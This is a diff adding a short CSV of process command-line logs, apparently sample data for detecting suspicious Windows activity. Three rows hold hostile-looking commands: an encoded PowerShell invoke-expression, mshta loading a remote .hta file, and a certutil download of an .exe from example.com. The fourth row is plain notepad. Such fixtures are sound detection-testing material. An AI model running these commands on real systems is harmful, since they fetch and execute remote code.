@@ -1,0 +1,5 @@
+timestamp,process_name,command_line
+2025-02-01 10:00,powershell.exe,powershell.exe -enc SQBFAFgA
+2025-02-01 10:01,mshta.exe,mshta.exe http://example.com/a.hta
+2025-02-01 10:02,certutil.exe,certutil.exe -urlcache -split http://example.com/file.exe
+2025-02-01 10:03,notepad.exe,notepad.exe
